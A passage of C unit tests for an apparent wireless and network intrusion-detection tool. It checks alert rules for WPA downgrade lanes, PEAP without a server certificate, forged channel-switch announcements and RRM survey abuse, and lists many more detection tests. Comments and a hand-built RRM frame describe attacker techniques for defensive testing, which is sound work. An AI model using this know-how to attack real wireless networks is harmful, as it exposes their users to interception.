    ASSERT(strstr(s.alerts[idx].detail, "WPA2+WPA3 transition") != NULL);
    ASSERT_EQ(strcmp(s.alerts[idx].technique, "T1600"), 0);
}

static void test_wpa_downgrade_observation_floor(void) {
    /* Seen for 5 seconds: a sample caught mid-hop, not a configuration.
     * Without this floor --hop alerts on every AP it brushes past. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x61, "corp", "WPA3", RSN_AKM_PSK | RSN_AKM_SAE, 2, 5);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE), -1);
}

static void test_wpa_downgrade_two_kinds_two_alerts(void) {
    /* An AP offering two lanes is two things to fix. Collapsing them
     * would hide whichever the operator did not read. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    beacon_ap_t *a = add_ap(&s, 0x62, "corp", "WPA3",
                            RSN_AKM_PSK | RSN_AKM_SAE, 1, 120);
    a->has_wpa1 = 1;
    alerts_update(&s);
    ASSERT_EQ(count_alerts(&s, ALERT_TYPE_WPA_DOWNGRADE), 3);
}

static void test_wpa_downgrade_owe_transition_needs_the_pair(void) {
    /* The element on its own is not the finding — the open BSS it
     * points at is the downgrade lane, and without one there is nothing
     * to downgrade to. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    beacon_ap_t *o = add_ap(&s, 0x63, "cafe", "WPA3", RSN_AKM_OWE, 2, 120);
    o->owe_trans = 1;
    /* A same-SSID neighbour that is *not* open. The companion has to be
     * the open lane specifically — without this second AP the test
     * passes against a pairing loop that accepts any neighbour at all. */
    add_ap(&s, 0x6f, "cafe", "WPA2", RSN_AKM_PSK, 2, 120);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE), -1);

    alerts_clear();
    seed_state(&s);
    o = add_ap(&s, 0x63, "cafe", "WPA3", RSN_AKM_OWE, 2, 120);
    o->owe_trans = 1;
    add_ap(&s, 0x64, "cafe", "OPEN", 0, 0, 120);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "OWE transition") != NULL);
}

static void test_wpa_downgrade_my_bssid_is_crit(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x65, "corp", "WPA3", RSN_AKM_PSK | RSN_AKM_SAE, 2, 120);
    ownership_add_bssid("aa:bb:cc:dd:ee:65");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "YOUR network") != NULL);
    ownership_clear();
}

static void test_wpa_downgrade_exercised_lane_is_crit(void) {
    /* The offer standing open is a WARN. A client having taken it —
     * evidence from #60's assoc-request delta — is an incident. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x66, "corp", "WPA3", RSN_AKM_PSK | RSN_AKM_SAE, 2, 120);
    assoc_req_t *r = &s.assoc_reqs[s.assoc_req_count++];
    memset(r, 0, sizeof(*r));
    memcpy(r->bssid, s.beacon_aps[0].bssid, 6);
    r->downgrade_flags = ASSOC_DG_AKM;
    r->ts = time(NULL) - 60;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "took the weak lane") != NULL);
}

static void test_wpa_downgrade_stale_delta_does_not_escalate(void) {
    /* A downgrade from two hours ago is history, not a live incident. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x67, "corp", "WPA3", RSN_AKM_PSK | RSN_AKM_SAE, 2, 120);
    assoc_req_t *r = &s.assoc_reqs[s.assoc_req_count++];
    memset(r, 0, sizeof(*r));
    memcpy(r->bssid, s.beacon_aps[0].bssid, 6);
    r->downgrade_flags = ASSOC_DG_AKM;
    r->ts = time(NULL) - 7200;
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_wpa_downgrade_clean_wpa3_is_quiet(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x68, "corp", "WPA3", RSN_AKM_SAE, 2, 120);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WPA_DOWNGRADE), -1);
}


/* ── PEAP no-server-cert rule (#65) ──────────────────────── */

static rogue_radius_ap_t *add_nocert(sloth_state_t *s, uint8_t last,
                                     int sessions, int no_hello) {
    rogue_radius_ap_t *r = &s->rogue_radius[s->rogue_radius_count++];
    memset(r, 0, sizeof(*r));
    r->bssid[0] = 0xde; r->bssid[1] = 0xad; r->bssid[2] = 0xbe;
    r->bssid[3] = 0xef; r->bssid[4] = 0x00; r->bssid[5] = last;
    r->last_nocert_sta[0] = 0x12; r->last_nocert_sta[1] = 0x22;
    r->last_nocert_sta[2] = 0x33; r->last_nocert_sta[3] = 0x44;
    r->last_nocert_sta[4] = 0x55; r->last_nocert_sta[5] = 0x66;
    r->nocert_sessions = sessions;
    r->nocert_no_hello = no_hello;
    r->last_seen = time(NULL);
    return r;
}

static void test_peap_nocert_fires(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_nocert(&s, 0x01, 1, 1);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PEAP_NO_SERVER_CERT);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "no TLS ServerHello") != NULL);
    ASSERT_EQ(strcmp(s.alerts[idx].technique, "T1557"), 0);
}

static void test_peap_nocert_wording_softer_without_hello_miss(void) {
    /* A ServerHello was seen but no Certificate. Same finding, but a
     * large cert chain can also cross an EAP fragment boundary sloth
     * does not reassemble — so the detail must not overclaim. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_nocert(&s, 0x02, 1, 0);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PEAP_NO_SERVER_CERT);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "no Certificate observed") != NULL);
}

static void test_peap_nocert_quiet_when_clean(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_nocert(&s, 0x03, 0, 0);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PEAP_NO_SERVER_CERT), -1);
}

static void test_peap_nocert_my_bssid_is_crit(void) {
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_nocert(&s, 0x04, 1, 1);
    ownership_add_bssid("de:ad:be:ef:00:04");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PEAP_NO_SERVER_CERT);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ownership_clear();
}

static void test_peap_nocert_rostered_client_is_crit(void) {
    /* The CVE's actual population: the operator's own handsets, shipped
     * with a supplicant configuration that accepts an unverified
     * server. A rostered device doing it is the finding that matters. */
    alerts_clear(); ownership_clear();
    sloth_state_t s; seed_state(&s);
    add_nocert(&s, 0x05, 1, 1);
    ownership_add_known_mac("12:22:33:44:55:66");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PEAP_NO_SERVER_CERT);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "rostered client") != NULL);
    ownership_clear();
}


/* ── CSA abuse rule (#63) ────────────────────────────────── */

static void add_csa(sloth_state_t *s, const uint8_t *bssid,
                    const uint8_t *ta, uint8_t chan, int source) {
    sloth_csa_event_t *e = &s->csa_events[s->csa_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->bssid, bssid, 6);
    memcpy(e->ta, ta ? ta : bssid, 6);
    e->new_channel = chan;
    e->switch_mode = 1;
    e->switch_count = 3;
    e->source = (uint8_t)source;
    e->ts = time(NULL);
}

static const uint8_t CSA_AP[6]    = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x70 };
static const uint8_t CSA_ROGUE[6] = { 0x66, 0x66, 0x66, 0x66, 0x66, 0x66 };

static void test_csa_legit_single_target_quiet(void) {
    /* One announcement, one destination, sent by the BSS itself. This
     * is DFS working, and it must stay silent. */
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    add_csa(&s, CSA_AP, CSA_AP, 36, CSA_SRC_BEACON);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_CSA_ABUSE), -1);
}

static void test_csa_forged_transmitter_is_crit(void) {
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    add_csa(&s, CSA_AP, CSA_ROGUE, 11, CSA_SRC_ACTION);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_CSA_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "forged TA") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "66:66:66:66:66:66") != NULL);
}

static void test_csa_beacon_address_mismatch_is_not_a_forgery(void) {
    /* A beacon's addr2 and addr3 are the same by construction, so a
     * mismatch there means the frame was misread rather than forged.
     * Treating it as a spoof would turn a parser bug into an attack. */
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    add_csa(&s, CSA_AP, CSA_ROGUE, 11, CSA_SRC_BEACON);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_CSA_ABUSE), -1);
}

static void test_csa_storm_fires(void) {
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < CSA_STORM_THRESH; i++)
        add_csa(&s, CSA_AP, CSA_AP, (uint8_t)(36 + i * 4), CSA_SRC_BEACON);
    /* The rule reads the live ring for the distinct count, so the ring
     * has to see the same events the snapshot does. */
    for (int i = 0; i < CSA_STORM_THRESH; i++)
        csa_observe(CSA_AP, CSA_AP, 36 + i * 4, 0, 1, 3,
                    CSA_SRC_BEACON, 6, time(NULL));
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_CSA_ABUSE);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "storm") != NULL);
    csa_clear();
}

static void test_csa_repeat_of_one_target_is_not_a_storm(void) {
    /* An AP announcing the same switch on every beacon until it happens
     * is doing exactly what the standard says. Counting announcements
     * instead of destinations would fire on every DFS event. */
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < CSA_STORM_THRESH * 3; i++) {
        add_csa(&s, CSA_AP, CSA_AP, 36, CSA_SRC_BEACON);
        csa_observe(CSA_AP, CSA_AP, 36, 0, 1, 3, CSA_SRC_BEACON, 6,
                    time(NULL));
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_CSA_ABUSE), -1);
    csa_clear();
}

static void test_csa_target_hosting_a_twin_is_crit(void) {
    /* The destination is where a known rogue is sitting. That is the
     * difference between a channel change and a forced roam. */
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    add_csa(&s, CSA_AP, CSA_AP, 40, CSA_SRC_BEACON);
    beacon_ap_t *rogue = add_ap(&s, 0x71, "corp", "WPA2", RSN_AKM_PSK, 2, 120);
    rogue->channel = 40;
    twin_episode_t *t = &s.twin_episodes[s.twin_episode_count++];
    memset(t, 0, sizeof(*t));
    memcpy(t->twin_bssid, rogue->bssid, 6);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_CSA_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "known twin") != NULL);
}

static void test_csa_one_alert_per_bssid_not_per_event(void) {
    /* An AP announcing on every beacon must produce one finding, not
     * one per frame. */
    alerts_clear(); ownership_clear(); csa_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 5; i++)
        add_csa(&s, CSA_AP, CSA_ROGUE, 11, CSA_SRC_ACTION);
    alerts_update(&s);
    ASSERT_EQ(count_alerts(&s, ALERT_TYPE_CSA_ABUSE), 1);
}


/* ── RRM survey abuse rule (#61) ─────────────────────────── */

static const uint8_t RRM_AP[6]  = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x80 };
static const uint8_t RRM_CLI[6] = { 0x12, 0x22, 0x33, 0x44, 0x55, 0x88 };

/* Drive the live RRM table — the rule reads it, not the snapshot. */
static void feed_rrm(const uint8_t *bssid, const uint8_t *sta,
                     int n, const char *ssid) {
    uint8_t f[160];
    memset(f, 0, 24);
    f[0] = 0xD0;
    memcpy(f + 4,  sta,   6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    int off = 24;
    f[off++] = ACTION_CAT_RRM;
    f[off++] = RRM_ACT_MEASUREMENT_REQUEST;
    f[off++] = 0x01; f[off++] = 0x00; f[off++] = 0x00;
    int slen = ssid ? (int)strlen(ssid) : 0;
    f[off++] = 38;
    f[off++] = (uint8_t)(3 + 13 + (ssid ? 2 + slen : 0));
    f[off++] = 0x01; f[off++] = 0x00; f[off++] = RRM_MEAS_TYPE_BEACON;
    f[off++] = 81; f[off++] = 6;
    f[off++] = 0; f[off++] = 0; f[off++] = 0x64; f[off++] = 0; f[off++] = 0;
    for (int i = 0; i < 6; i++) f[off++] = 0xff;
    if (ssid) {
        f[off++] = 0; f[off++] = (uint8_t)slen;
        memcpy(f + off, ssid, (size_t)slen); off += slen;
    }
    for (int i = 0; i < n; i++) rrm_parse_action(f, off, time(NULL));
}

static void test_rrm_asking_about_its_own_ssid_is_quiet(void) {
    /* A controller steering its own clients asks about networks it
     * advertises. This is 802.11k working, at any rate. */
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    beacon_ap_t *a = add_ap(&s, 0x80, "corp-wifi", "WPA2", RSN_AKM_PSK, 2, 300);
    (void)a;
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH * 2, "corp-wifi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE), -1);
    rrm_clear();
}

static void test_rrm_fishing_for_a_foreign_ssid_fires(void) {
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x80, "guest-net", "WPA2", RSN_AKM_PSK, 2, 300);
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH, "corp-wifi");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "never beaconed that SSID") != NULL);
    ASSERT_EQ(strcmp(s.alerts[idx].technique, "T1595.002"), 0);
    rrm_clear();
}

static void test_rrm_unheard_asker_does_not_fire(void) {
    /* The hop-mode guard. A BSSID we have never heard beacon tells us
     * nothing about what it does or does not advertise — inferring
     * "never beaconed that SSID" from a sampling gap would make --hop
     * fire on every AP the sweep happened to miss. */
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH * 2, "corp-wifi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE), -1);
    rrm_clear();
}

static void test_rrm_multi_vap_ssid_history_exonerates(void) {
    /* One radio, several VAPs: the SSID may be in the AP's history
     * rather than its current beacon. Matching only the live SSID would
     * report every multi-SSID deployment as fishing. */
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    beacon_ap_t *a = add_ap(&s, 0x80, "guest-net", "WPA2", RSN_AKM_PSK, 2, 300);
    snprintf(a->ssid_history[0], 33, "corp-wifi");
    a->ssid_history_n = 1;
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH * 2, "corp-wifi");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE), -1);
    rrm_clear();
}

static void test_rrm_outsider_surveying_my_ssid_is_crit(void) {
    /* The strongest condition: someone else's AP asking the operator's
     * clients about the operator's network. */
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x80, "guest-net", "WPA2", RSN_AKM_PSK, 2, 300);
    ownership_add_ssid("corp-wifi");
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH, "corp-wifi");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
    ASSERT(strstr(s.alerts[idx].detail, "surveying YOUR network") != NULL);
    ownership_clear(); rrm_clear();
}

static void test_rrm_my_own_ap_surveying_my_ssid_is_not_an_outsider(void) {
    /* Designating both the SSID and the BSSID means this is the
     * operator's own controller doing its job. */
    alerts_clear(); ownership_clear(); rrm_clear();
    sloth_state_t s; seed_state(&s);
    add_ap(&s, 0x80, "guest-net", "WPA2", RSN_AKM_PSK, 2, 300);
    ownership_add_ssid("corp-wifi");
    ownership_add_bssid("aa:bb:cc:dd:ee:80");
    feed_rrm(RRM_AP, RRM_CLI, RRM_SURVEY_THRESH, "corp-wifi");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_RRM_SURVEY_ABUSE);
    /* Still fires — the asker has never beaconed that SSID — but as a
     * WARN, not as an outsider surveying the network. */
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "surveying YOUR network") == NULL);
    ownership_clear(); rrm_clear();
}

void run_alerts_tests(void) {
    TEST_SUITE("alerts rule firing");
    RUN_TEST(test_port_scan_fires);
    RUN_TEST(test_port_scan_not_flagged_no_fire);
    RUN_TEST(test_deauth_flood_fires);
    RUN_TEST(test_deauth_flood_detail_content);
    RUN_TEST(test_beacon_flood_fires);
    RUN_TEST(test_beacon_flood_few_no_fire);
    RUN_TEST(test_auth_flood_fires);
    RUN_TEST(test_auth_flood_quiet_no_fire);
    RUN_TEST(test_assoc_flood_fires);
    RUN_TEST(test_assoc_flood_quiet_no_fire);
    RUN_TEST(test_assoc_flood_few_sources_labelled);
    RUN_TEST(test_assoc_flood_my_network_is_crit);
    RUN_TEST(test_btm_abuse_fires_at_threshold);
    RUN_TEST(test_btm_abuse_below_threshold_quiet);
    RUN_TEST(test_btm_abuse_ignores_ordinary_steering);
    RUN_TEST(test_btm_abuse_evil_twin_candidate_is_crit);
    RUN_TEST(test_btm_abuse_real_half_candidate_is_not_twin);
    RUN_TEST(test_btm_abuse_source_never_beaconed_reported);
    RUN_TEST(test_btm_abuse_known_source_omits_the_tell);
    RUN_TEST(test_btm_abuse_fabricated_candidate_reported);
    RUN_TEST(test_btm_abuse_my_bssid_is_crit);
    RUN_TEST(test_btm_abuse_rostered_client_is_crit);
    RUN_TEST(test_btm_abuse_dedup_key_is_the_pair);
    RUN_TEST(test_btm_abuse_reports_total_alongside_imminent);
    RUN_TEST(test_downgrade_flags_transition_mode);
    RUN_TEST(test_downgrade_flags_pure_wpa3_is_clean);
    RUN_TEST(test_downgrade_flags_mfp_optional_needs_sae);
    RUN_TEST(test_downgrade_flags_mfp_off_is_not_this_finding);
    RUN_TEST(test_downgrade_flags_wpa1_needs_rsn);
    RUN_TEST(test_downgrade_flags_family_not_substring);
    RUN_TEST(test_wpa_downgrade_transition_fires);
    RUN_TEST(test_wpa_downgrade_observation_floor);
    RUN_TEST(test_wpa_downgrade_two_kinds_two_alerts);
    RUN_TEST(test_wpa_downgrade_owe_transition_needs_the_pair);
    RUN_TEST(test_wpa_downgrade_my_bssid_is_crit);
    RUN_TEST(test_wpa_downgrade_exercised_lane_is_crit);
    RUN_TEST(test_wpa_downgrade_stale_delta_does_not_escalate);
    RUN_TEST(test_wpa_downgrade_clean_wpa3_is_quiet);
    RUN_TEST(test_peap_nocert_fires);
    RUN_TEST(test_peap_nocert_wording_softer_without_hello_miss);
    RUN_TEST(test_peap_nocert_quiet_when_clean);
    RUN_TEST(test_peap_nocert_my_bssid_is_crit);
    RUN_TEST(test_peap_nocert_rostered_client_is_crit);
    RUN_TEST(test_csa_legit_single_target_quiet);
    RUN_TEST(test_csa_forged_transmitter_is_crit);
    RUN_TEST(test_csa_beacon_address_mismatch_is_not_a_forgery);
    RUN_TEST(test_csa_storm_fires);
    RUN_TEST(test_csa_repeat_of_one_target_is_not_a_storm);
    RUN_TEST(test_csa_target_hosting_a_twin_is_crit);
    RUN_TEST(test_csa_one_alert_per_bssid_not_per_event);
    RUN_TEST(test_rrm_asking_about_its_own_ssid_is_quiet);
    RUN_TEST(test_rrm_fishing_for_a_foreign_ssid_fires);
    RUN_TEST(test_rrm_unheard_asker_does_not_fire);
    RUN_TEST(test_rrm_multi_vap_ssid_history_exonerates);
    RUN_TEST(test_rrm_outsider_surveying_my_ssid_is_crit);
    RUN_TEST(test_rrm_my_own_ap_surveying_my_ssid_is_not_an_outsider);
    RUN_TEST(test_nxdomain_burst_fires_at_threshold);
    RUN_TEST(test_nxdomain_below_threshold_no_fire);
    RUN_TEST(test_nxdomain_outside_window_no_fire);
    RUN_TEST(test_threat_domain_fires_on_ioc);
    RUN_TEST(test_threat_domain_clean_no_fire);
    RUN_TEST(test_threat_ip_fires);
    RUN_TEST(test_arp_spoof_no_alert_on_first_obs);
    RUN_TEST(test_arp_spoof_fires_on_mac_change);
    RUN_TEST(test_arp_spoof_silent_on_same_mac);
    RUN_TEST(test_arp_spoof_skips_multicast_mac);
    RUN_TEST(test_arp_spoof_skips_all_zero_mac);
    RUN_TEST(test_arp_spoof_detail_contains_both_macs);
    RUN_TEST(test_arp_spoof_history_overflow_safe);
    RUN_TEST(test_rogue_dhcp_single_server_no_fire);
    RUN_TEST(test_rogue_dhcp_two_servers_fires);
    RUN_TEST(test_rogue_dhcp_client_requests_dont_count);
    RUN_TEST(test_rogue_dhcp_detail_lists_servers_sorted);
    RUN_TEST(test_rogue_dhcp_match_port_is_server_port);
    RUN_TEST(test_rogue_ra_single_router_no_fire);
    RUN_TEST(test_rogue_ra_two_routers_fires);
    RUN_TEST(test_rogue_ra_zero_lifetime_dont_count);
    RUN_TEST(test_rogue_ra_detail_lists_routers_sorted);
    RUN_TEST(test_rogue_ra_dedup_same_router);
    RUN_TEST(test_smb1_use_fires_on_smb1_session);
    RUN_TEST(test_smb1_use_no_fire_on_smb2);
    RUN_TEST(test_smb1_use_separate_alert_per_session);
    RUN_TEST(test_kerb_preauth_burst_fires_at_threshold);
    RUN_TEST(test_kerb_preauth_burst_below_threshold_no_fire);
    RUN_TEST(test_kerb_preauth_burst_per_source);
    RUN_TEST(test_ldap_search_flood_fires_at_threshold);
    RUN_TEST(test_ldap_search_flood_below_threshold_no_fire);
    RUN_TEST(test_ldap_search_flood_per_source);
    RUN_TEST(test_bgp_notification_burst_fires_at_threshold);
    RUN_TEST(test_bgp_notification_burst_below_threshold_no_fire);
    RUN_TEST(test_bgp_notification_burst_per_peer_pair);
    RUN_TEST(test_ssh_brute_force_fires_at_threshold);
    RUN_TEST(test_ssh_brute_force_below_threshold_no_fire);
    RUN_TEST(test_ssh_brute_force_per_pair);
    RUN_TEST(test_rdp_brute_force_fires_at_threshold);
    RUN_TEST(test_rdp_brute_force_below_threshold_no_fire);
    RUN_TEST(test_rdp_brute_force_per_pair);
    RUN_TEST(test_rdp_brute_force_no_cookie);
    RUN_TEST(test_snmp_community_brute_fires_at_threshold);
    RUN_TEST(test_snmp_community_brute_below_threshold_no_fire);
    RUN_TEST(test_snmp_community_brute_per_pair);
    RUN_TEST(test_mqtt_brute_fires_at_connect_threshold);
    RUN_TEST(test_mqtt_brute_fires_at_fail_threshold);
    RUN_TEST(test_mqtt_brute_below_both_thresholds_no_fire);
    RUN_TEST(test_mqtt_brute_per_pair);
    RUN_TEST(test_rogue_dhcp_dedup_same_server);
    RUN_TEST(test_evil_twin_open_plus_wpa2_fires);
    RUN_TEST(test_evil_twin_two_wpa2_no_fire);
    RUN_TEST(test_evil_twin_two_open_no_fire);
    RUN_TEST(test_evil_twin_different_ssids_no_fire);
    RUN_TEST(test_evil_twin_detail_contains_bssids_and_ssid);
    RUN_TEST(test_evil_twin_same_cipher_diff_oui_fires_warn);
    RUN_TEST(test_evil_twin_same_cipher_same_oui_no_fire);
    RUN_TEST(test_evil_twin_mutual_neighbors_no_fire);
    RUN_TEST(test_evil_twin_one_way_neighbor_no_fire);
    RUN_TEST(test_evil_twin_unrelated_neighbors_still_fires);
    RUN_TEST(test_evil_twin_no_neighbor_reports_still_fires);
    RUN_TEST(test_evil_twin_neighbors_do_not_excuse_open_clone);
    RUN_TEST(test_infrastructure_peers_predicate);
    RUN_TEST(test_infrastructure_peers_clamps_neighbor_count);

    TEST_SUITE("alerts: operator-designated networks (#52)");
    RUN_TEST(test_my_net_recon_fires_for_unassociated_client);
    RUN_TEST(test_my_net_recon_associated_client_no_fire);
    RUN_TEST(test_my_net_recon_assoc_by_designated_bssid_no_fire);
    RUN_TEST(test_my_net_recon_unrelated_assoc_still_fires);
    RUN_TEST(test_my_net_recon_other_ssid_no_fire);
    RUN_TEST(test_my_net_recon_no_designation_no_fire);
    RUN_TEST(test_my_net_recon_matches_any_pnl_slot);
    RUN_TEST(test_my_net_recon_clamps_ssid_count);
    RUN_TEST(test_deauth_flood_on_my_bssid_escalates_crit);
    RUN_TEST(test_deauth_flood_elsewhere_stays_warn);
    RUN_TEST(test_deauth_flood_no_designation_stays_warn);

    TEST_SUITE("alerts: recurring transit (#54)");
    RUN_TEST(test_recurring_transit_fires_at_threshold);
    RUN_TEST(test_two_passes_do_not_fire);
    RUN_TEST(test_stale_passes_do_not_fire);
    RUN_TEST(test_no_transits_no_fire);

    TEST_SUITE("alerts: unknown device on my network (#55)");
    RUN_TEST(test_unknown_device_on_my_network_fires);
    RUN_TEST(test_rostered_device_does_not_fire);
    RUN_TEST(test_unknown_device_on_foreign_network_no_fire);
    RUN_TEST(test_unknown_device_matches_by_designated_bssid);
    RUN_TEST(test_roster_without_designation_is_inert);
    RUN_TEST(test_designation_without_roster_is_inert);
    RUN_TEST(test_unconfigured_is_inert);
    RUN_TEST(test_unknown_device_notes_randomised_mac);

    TEST_SUITE("alerts: channel RF degradation (B3)");
    RUN_TEST(test_rf_degraded_fires_at_threshold);
    RUN_TEST(test_rf_degraded_below_threshold_no_fire);
    RUN_TEST(test_rf_degraded_unknown_ratio_no_fire);
    RUN_TEST(test_rf_degraded_is_per_channel);
    RUN_TEST(test_rf_degraded_no_channels_no_fire);
    RUN_TEST(test_evil_twin_diff_cipher_same_ssid_no_fire);
    RUN_TEST(test_evil_twin_same_open_diff_oui_no_fire);
    RUN_TEST(test_evil_twin_open_plus_wpa2_diff_oui_still_crit);
    RUN_TEST(test_evil_twin_same_cipher_diff_oui_pair_dedups);
    RUN_TEST(test_evil_twin_vendor_hash_mismatch_escalates_crit);
    RUN_TEST(test_evil_twin_vendor_hash_match_stays_warn);
    RUN_TEST(test_evil_twin_vendor_hash_zero_no_escalate);
    RUN_TEST(test_evil_twin_hak5_oui_escalates_crit);
    RUN_TEST(test_evil_twin_espressif_oui_escalates_crit);
    RUN_TEST(test_evil_twin_diff_oui_no_signals_stays_warn);
    RUN_TEST(test_evil_twin_proximity_fires_at_threshold);
    RUN_TEST(test_evil_twin_proximity_below_threshold_no_fire);
    RUN_TEST(test_evil_twin_proximity_large_swing_fires);
    RUN_TEST(test_evil_twin_proximity_unseen_min_no_fire);
    RUN_TEST(test_evil_twin_proximity_unseen_max_no_fire);
    RUN_TEST(test_evil_twin_proximity_per_bssid);
    RUN_TEST(test_evil_twin_attack_chain_fires_crit);
    RUN_TEST(test_evil_twin_attack_chain_stale_deauth_no_fire);
    RUN_TEST(test_evil_twin_attack_chain_no_twin_no_fire);
    RUN_TEST(test_evil_twin_attack_chain_no_flood_no_fire);
    RUN_TEST(test_evil_twin_attack_chain_reverse_direction);
    RUN_TEST(test_evil_twin_taint_clear_drops_entries);
    RUN_TEST(test_e2e_full_attack_chain);
    RUN_TEST(test_e2e_clean_baseline_no_alerts);
    RUN_TEST(test_karma_three_ssids_fires);
    RUN_TEST(test_karma_two_ssids_no_fire);
    RUN_TEST(test_karma_one_ssid_no_fire);
    RUN_TEST(test_karma_pnl_overlap_in_detail);
    RUN_TEST(test_karma_deauth_then_lure_in_detail);
    RUN_TEST(test_karma_stale_deauth_no_chain_note);
    RUN_TEST(test_ssid_confusion_wpa3_to_wpa2_fires);
    RUN_TEST(test_ssid_confusion_identical_posture_no_fire);
